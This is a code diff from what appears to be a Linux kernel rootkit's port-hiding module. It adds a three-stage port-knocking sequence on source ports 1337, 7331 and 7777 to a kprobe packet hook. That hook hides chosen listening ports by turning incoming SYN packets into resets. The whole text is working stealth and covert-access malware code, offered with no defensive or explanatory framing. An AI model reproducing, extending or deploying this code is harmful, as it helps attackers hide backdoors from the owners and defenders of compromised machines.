@@ -14,10 +14,39 @@
 #include "hook.h"
 #include "porthide.h"
 
+
+// stage 1: 1337
+knock_list_t ips_stage1 = {
+    .ip  = { 0 },
+    .version = -1,
+    .prev = NULL,
+    .next = NULL,
+};
+
+knock_list_t_ptr ips_stage1_tail = &ips_stage1;
+
+// stage 2: 7331
+knock_list_t ips_stage2 = {
+    .ip  = { 0 },
+    .version = -1,
+    .prev = NULL,
+    .next = NULL,
+};
+
+knock_list_t_ptr ips_stage2_tail = &ips_stage2;
+
+// stage 3: 7777
+knock_list_t ips_stage3 = {
+    .ip  = { 0 },
+    .version = -1,
+    .prev = NULL,
+    .next = NULL,
+};
+
+knock_list_t_ptr ips_stage3_tail = &ips_stage3;
+
 lport_list_t hidden_lports = {
     .lport = -1,
-    .knock_head = NULL,
-    .knock_tail = NULL,
     .prev = NULL,
     .next = NULL,
 };
@@ -77,14 +106,14 @@ unhide_lports(void)
 void
 hide_lport(lport_t lport)
 {
-    /* if (!list_contains_ip(&hidden_ips, ipv6, v6)) */
-    /*     add_ip_to_list(hidden_ips_tail, ipv6, v6); */
+    if (!list_contains_lport(&hidden_lports, lport))
+        add_lport_to_list(hidden_lports_tail, lport);
 }
 
 void
 unhide_lport(lport_t lport)
 {
-    /* remove_ip_from_list(&hidden_ips, ipv6, v6); */
+    remove_lport_from_list(hidden_lports_tail, lport);
 }
 
 static int
@@ -94,7 +123,7 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
     skb = (struct sk_buff *)pt_regs->di;
 
     u8 protocol = 0;
-    u8 ip[16] = {0};
+    u8 ip[16] = { 0 };
     ip_version version;
 
     char *data = skb_network_header(skb);
@@ -131,20 +160,32 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
         tcphdr = (struct tcphdr *)skb_transport_header(skb);
         unsigned src_port = (unsigned)ntohs(tcphdr->source);
 
-        lport_list_t_ptr list = NULL;
-        if ((list = find_lport_in_list(&hidden_lports, src_port))) {
-            knock_list_t_ptr knocks = NULL;
+        if (list_contains_knock(&ips_stage3, ip, version))
+            return 0;
 
-            if (!(knocks = find_knock_in_list(list->knock_head, ip, version)))
-            {
+        if (list_contains_knock(&ips_stage2, ip, version)) {
+            if (src_port == 7777)
+                add_knock_to_list(&ips_stage3_tail, ip, version);
 
-            }
+            remove_knock_from_list(&ips_stage2, &ips_stage2_tail, ip, version);
+            goto check_port;
+        } else if (list_contains_knock(&ips_stage1, ip, version)) {
+            if (src_port == 7331)
+                add_knock_to_list(&ips_stage2_tail, ip, version);
 
+            remove_knock_from_list(&ips_stage1, &ips_stage1_tail, ip, version);
+            goto check_port;
+        } else {
+            if (src_port == 1337)
+                add_knock_to_list(&ips_stage1_tail, ip, version);
+        }
+
+check_port:
+        if (list_contains_lport(&hidden_lports, src_port))
             if (tcphdr->syn) {
                 tcphdr->syn = 0;
                 tcphdr->rst = 1;
             }
-        }
     }
 
     return 0;
@@ -226,15 +267,6 @@ remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
     return ret;
 }
 
-void
-clear_lport_knocks(lport_list_t_ptr list)
-{
-    if (list && list->knock_tail) {
-        knock_list_t_ptr i = list->knock_tail;
-        while ((i = remove_knock_from_list(i, &list->knock_tail, i->ip, i->version)));
-    }
-}
-
 bool
 list_contains_knock(knock_list_t_ptr list, ip_t ip, ip_version version)
 {
@@ -246,11 +278,8 @@ find_knock_in_list(knock_list_t_ptr head, ip_t ip, ip_version version)
 {
     knock_list_t_ptr i;
     for (i = head; i; i = i->next)
-        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16))
-            && (version == -1 || i->version == version))
-        {
+        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version))
             return i;
-        }
 
     return NULL;
 }
@@ -279,9 +308,7 @@ remove_knock_from_list(knock_list_t_ptr list, knock_list_t_ptr *tail, ip_t ip, i
 {
     knock_list_t_ptr i = find_knock_in_list(list, ip, version), ret = NULL;
 
-    if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16))
-        && i->version != -1))
-    {
+    if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
         if (i->next)
             i->next->prev = i->prev;
         else
